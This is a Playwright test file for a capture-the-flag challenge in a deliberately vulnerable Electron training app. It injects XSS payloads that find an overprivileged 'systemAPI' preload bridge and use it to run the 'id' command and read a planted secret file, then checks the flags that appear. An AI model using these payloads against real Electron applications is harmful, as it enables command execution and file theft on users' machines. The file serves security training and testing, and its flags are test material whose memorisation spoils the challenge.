// Behavioral test for Challenge 2 — Bridged (What Can XSS Do in Electron?).
//
// Drives the REAL Electron app (via Playwright's `_electron`), same approach as Challenge 1's
// test: exercises the actual injection sink, the actual dedicated window/preload, the actual
// IPC-backed bridge, and real command execution — not a mock of any of it. Asserts that the
// bridge is genuinely discoverable, genuinely callable, and genuinely reaches the OS.
const fs = require('node:fs');
const path = require('node:path');
const { test, expect, _electron: electron } = require('@playwright/test');

const APP_DIR = path.resolve(__dirname, '..');
const ELECTRON_BIN = path.join(
  APP_DIR,
  'node_modules/electron/dist/electron' + (process.platform === 'win32' ? '.exe' : '')
);
const MAIN_JS_PATH = path.join(APP_DIR, 'src/main/main.js');
const USER_DATA_DIR = path.join(require('node:os').tmpdir(), `dvea-test-xss-2-bridged-${process.pid}`);
const BRIDGE_SECRET_PATH = '/tmp/dvea-bridge-secret.txt';

async function inject(win, payload) {
  await win.fill('#xssInput2', payload);
  await win.click('#xssForm2 button[type=submit]');
}

test.describe('Challenge 2 — Bridged (XSS)', () => {
  let app;
  let mainWindow;
  let challengeWindow;

  test.beforeAll(async () => {
    app = await electron.launch({
      executablePath: ELECTRON_BIN,
      cwd: APP_DIR,
      // Isolated userData so this app instance gets its own single-instance lock (see
      // requestSingleInstanceLock in main.js). Without it, spec files running in parallel —
      // or a DVEA the developer already has open — collide and the launch is refused.
      args: [APP_DIR, `--user-data-dir=${USER_DATA_DIR}`],
      // Some shells/CI runners export these for unrelated tooling; if set, Electron runs as
      // plain Node instead of launching the app, so force them off for this launch only.
      env: { ...process.env, ELECTRON_RUN_AS_NODE: '', ELECTRON_NO_ATTACH_CONSOLE: '' },
      timeout: 30_000,
    });

    mainWindow =
      app.windows().find((w) => w.url().includes('index.html')) ||
      (await app.waitForEvent('window', {
        predicate: (w) => w.url().includes('index.html'),
        timeout: 15_000,
      }));
    await mainWindow.waitForLoadState('domcontentloaded');

    const [challengeWin] = await Promise.all([
      app.waitForEvent('window', {
        predicate: (w) => w.url().includes('xss-system-api.html'),
        timeout: 15_000,
      }),
      mainWindow.evaluate(() => window.api.openXSSBridged()),
    ]);
    challengeWindow = challengeWin;

    await challengeWindow.waitForSelector('#badge-preload');
    // Main pushes window.__dveaWindowConfig via executeJavaScript after did-finish-load;
    // wait for it so the config-badge test below isn't racing that push.
    await challengeWindow.waitForFunction(() => !!window.__dveaWindowConfig, null, { timeout: 5_000 });
  });

  test.afterAll(async () => {
    await app?.close().catch(() => {});
    try {
      fs.unlinkSync(BRIDGE_SECRET_PATH);
    } catch (err) {}
  });

  test('window has the same hardened core as Challenge 1, plus one exposed bridge', async () => {
    // Anchor: assert what main.js actually DECLARES for this window (source-level intent) —
    // same hardened core as Challenge 1's window. (Read from source rather than via
    // app.evaluate(): Playwright's Electron evaluate() runs the callback as a bare eval, which
    // has no `require` in scope — there's no CommonJS module wrapper to provide it there.)
    const mainSrc = fs.readFileSync(MAIN_JS_PATH, 'utf8');
    const fnMatch = mainSrc.match(/function openXSSBridgedWindow\(\)[\s\S]*?\n  \}/);
    expect(fnMatch, 'openXSSBridgedWindow() not found in main.js').toBeTruthy();
    expect(fnMatch[0]).toMatch(/sandbox:\s*true/);
    expect(fnMatch[0]).toMatch(/contextIsolation:\s*true/);
    expect(fnMatch[0]).toMatch(/nodeIntegration:\s*false/);
    // The one deviation from Challenge 1: a dedicated, distinct preload, not the default or
    // Challenge 1's zero-exposure one.
    expect(fnMatch[0]).toMatch(/preload-xss-bridged\.js/);

    // Effective: what Electron actually applied to this specific window, read straight from
    // the main process via the same getLastWebPreferences() API the Config Inspector uses.
    const effective = await app.evaluate(({ webContents }, urlFragment) => {
      const wc = webContents.getAllWebContents().find((w) => w.getURL().includes(urlFragment));
      if (!wc) return null;
      const wp = wc.getLastWebPreferences() || {};
      return { sandbox: !!wp.sandbox, contextIsolation: !!wp.contextIsolation, nodeIntegration: !!wp.nodeIntegration };
    }, 'xss-system-api.html');

    expect(effective, 'could not find the challenge window webContents in the main process').toBeTruthy();
    // ContextIsolation/NodeIntegration are enforced by the JS engine regardless of the OS
    // sandbox helper, so these must be true/false for real, not merely declared.
    expect(effective.contextIsolation).toBe(true);
    expect(effective.nodeIntegration).toBe(false);

    // The badges must be a faithful VIEW of that same main-process data, whatever it says —
    // not hardcoded true, and not independently (mis)measured in the renderer.
    const cfg = await challengeWindow.evaluate(() => window.__dveaWindowConfig);
    expect(cfg).toEqual(effective);

    await expect(challengeWindow.locator('#badge-sandbox')).toHaveText(
      `${cfg.sandbox ? '✓' : '✗'} Sandbox: ${cfg.sandbox}`
    );
    await expect(challengeWindow.locator('#badge-isolation')).toHaveText('✓ ContextIsolation: true');
    await expect(challengeWindow.locator('#badge-nodeintegration')).toHaveText('✓ NodeIntegration: false');

    // Unlike Challenge 1: this badge must read TRUE/red — the bridge exposure is the entire
    // point of this challenge, and it must be a genuine main-world observation, not asserted.
    const hasBridge = await challengeWindow.evaluate(() => typeof window.systemAPI !== 'undefined');
    expect(hasBridge).toBe(true);
    await expect(challengeWindow.locator('#badge-preload')).toHaveText('✗ Privileged bridge: true');
    await expect(challengeWindow.locator('#badge-preload')).toHaveClass(/\bfail\b/);

    if (!cfg.sandbox) {
      test.info().annotations.push({
        type: 'note',
        description:
          'Effective sandbox=false in this environment — likely missing the chrome-sandbox ' +
          'setuid fix documented in CLAUDE.md, not a bug in the app. Declared config above was ' +
          'still confirmed hardened.',
      });
    }
  });

  test('Task 1: enumerating window finds the real bridge, not a fabricated name', async () => {
    await inject(
      challengeWindow,
      `<img src=x onerror="var found = Object.keys(window).find(function (k) { return window[k] && typeof window[k].runCommand === 'function'; }); document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>found:' + found + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText('found:systemAPI');
    await expect(challengeWindow.locator('#task-1-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-1-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-1 .task-flag')).toContainText('DVEA{overprivileged_bridge_found}');
  });

  test('Task 2: calling the bridge genuinely round-trips through the main process', async () => {
    await inject(
      challengeWindow,
      `<img src=x onerror="window.systemAPI.runCommand('id').then(function (out) { document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + out.replace(/\\n/g, ' ') + '</li>'); })">`
    );

    // The real command's real output should be visible too, not just the flag — proving this
    // wasn't a canned response.
    await expect(challengeWindow.locator('#attacker-log')).toContainText(/uid=\d+/);
    await expect(challengeWindow.locator('#attacker-log')).toContainText('DVEA{bridge_command_executed}');
    await expect(challengeWindow.locator('#task-2-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-2-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-2 .task-flag')).toContainText('DVEA{bridge_command_executed}');
  });

  test('Task 3: the bridge reaches a real file on the real filesystem', async () => {
    // Confirm the secret is a real file on disk before the exploit (not something the page
    // could see any other way) — this is what proves Task 3 is real OS access, not staged UI.
    expect(fs.existsSync(BRIDGE_SECRET_PATH), 'openXSSBridgedWindow should have planted the secret file').toBe(true);
    const realSecret = fs.readFileSync(BRIDGE_SECRET_PATH, 'utf8').trim();
    expect(realSecret).toBe('DVEA{bridge_to_os_pivot}');

    await inject(
      challengeWindow,
      `<img src=x onerror="window.systemAPI.runCommand('cat ${BRIDGE_SECRET_PATH}').then(function (out) { document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + out.replace(/\\n/g, ' ') + '</li>'); })">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText('DVEA{bridge_to_os_pivot}');
    await expect(challengeWindow.locator('#task-3-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-3-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-3 .task-flag')).toContainText('DVEA{bridge_to_os_pivot}');
  });

  test('progress reaches 3 / 3 once all tasks are complete', async () => {
    await expect(challengeWindow.locator('#flag-progress')).toHaveText('(3 / 3 flags captured)');
  });
});
